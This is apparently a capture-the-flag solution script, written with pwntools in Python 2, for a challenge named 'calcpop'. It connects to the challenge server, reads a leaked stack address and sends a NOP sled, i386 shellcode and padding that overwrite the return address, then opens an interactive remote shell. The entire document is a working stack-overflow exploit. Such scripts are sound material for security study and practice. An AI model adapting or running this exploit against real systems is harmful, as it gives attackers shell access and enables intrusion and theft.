from pwn import *

context(arch="i386", os="linux")

HOST,PORT = "calcpop-4gh07blg.9447.plumbing", 9447
r = remote(HOST,PORT)
#r = process("./calcpop")

shellcode = asm(shellcraft.i386.linux.sh())

r.send("1\n")
r.recvuntil("your input was ")
addr = int(r.recvuntil("\n")[2:-1], 16)

print "addr:", hex(addr)

r.send(("\x90"*16 + shellcode + " ").ljust(0x9c, "A") + pack(addr+8)+"\n")
r.send("exit\n")
r.interactive()
